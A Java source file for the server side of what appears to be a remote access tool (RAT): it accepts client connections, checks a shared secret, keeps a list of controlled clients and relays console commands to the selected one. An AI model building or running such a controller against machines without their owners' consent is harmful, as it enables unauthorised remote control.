package main.java.rat.server;

import main.java.Main;
import main.java.rat.Environment;
import main.java.rat.command.ClientCommand;
import main.java.rat.command.Command;
import main.java.rat.command.ServerCommand;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.logger.StringLogger;
import main.java.rat.server.connectedClients.RATConnectedClient;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;

public class RATServer extends AbstractSocketServer implements Environment {

    private RATConnectedClient connectedClient = null;
    ArrayList<RATConnectedClient> clientList = new ArrayList<>();
    private CommandHandler commandHandler;
    private CommandHandler clientCommandsHandler;
    private int lastId = 0;
    private StringLogger logger;

    public RATServer(int port) {
        super(port);
        logger = this::log;
        commandHandler = new CommandHandler(logger, this, ServerCommand.getAllServerCommands());
        clientCommandsHandler = new CommandHandler(logger, ClientCommand.getAllClientCommands());
    }

    @Override
    void serverStarted() {
        logger.log("[server] Started server at port "+this.port
                +" and waiting for connections...");
        listenToConsoleCommands();
    }

    void listenToConsoleCommands() {
        Scanner console = new Scanner(System.in);


        new Thread(() -> {
            while (this.started) {
                String consoleCommand = console.nextLine();
                if(!commandHandler.commandExists(consoleCommand)) {
                    if(connectedClient == null) {
                        logger.log("Please connect to a client first to execute a client command");
                    } else {
                        connectedClient.sendCommand(consoleCommand);
                    }
                } else {
                    this.commandHandler.handleCommand(consoleCommand);
                }
            }
        }).start();

    }

    @Override
    void newConnection(Socket acceptedSocket, ObjectOutputStream outputStream, ObjectInputStream inputStream) {
        InputOutputHandler handler = new InputOutputHandler(
                acceptedSocket,
                outputStream,
                inputStream
          );
        RATConnectedClient client = new RATConnectedClient(this::log, lastId, handler, this);
        clientList.add(client);
        lastId++;
    }

    public void log(String message) {
        System.out.println(message);
    }

    public void clientDisconnected(RATConnectedClient client) {
        logger.log("[server] '"+client.getFullName()+"' disconnected");
        clientList.remove(client);
    }

    public void incorrectSecret(RATConnectedClient client) {
        logger.log("[server] Client ("+client.getId()+") tried to connect with incorrect secret, disconnecting the client...");
        client.disconnected();
    }

    public void unknownInitError(RATConnectedClient client, Exception e) {
        logger.log("[server] Unknown error occurred while performing init, disconnecting the client("+client.getId()+")...");
        logger.log("[server] Exception that was produced:");
        e.printStackTrace();
        client.disconnected();
    }

    public void successInit(RATConnectedClient client, String version) {
        logger.log("[server] "+client.getFullName()+" connected");
        if(!version.equals(Main.VERSION)) {
            logger.log("[server] WARNING the connected client version is not the same as this version, " +
                    "client: " + version+", this version: " + Main.VERSION);
        }
        if(this.clientList.size() == 1) {
            logger.log("[server] default connected to "+client.getFullName());
            this.connectedClient = client;
        }
    }

    public RATConnectedClient getClientFromId(int id) {
        for(RATConnectedClient client : this.clientList) {
            if(client.getId() == id)
                return client;
        }

        return null;
    }

    public RATConnectedClient getConnectedClient() {
        return connectedClient;
    }

    public void setConnectedClient(RATConnectedClient connectedClient) {
        this.connectedClient = connectedClient;
    }

    public ArrayList<RATConnectedClient> getClientList() {
        return clientList;
    }

    public int getLastId() {
        return lastId;
    }

    public ArrayList<Command> getCommands() {
        ArrayList<Command> totalCommands = new ArrayList<>();
        totalCommands.addAll(commandHandler.getCommands());
        totalCommands.addAll(clientCommandsHandler.getCommands());

        return totalCommands;
    }

    @Override
    public boolean isServer() {
        return true;
    }

    @Override
    public boolean isClient() {
        return false;
    }
}
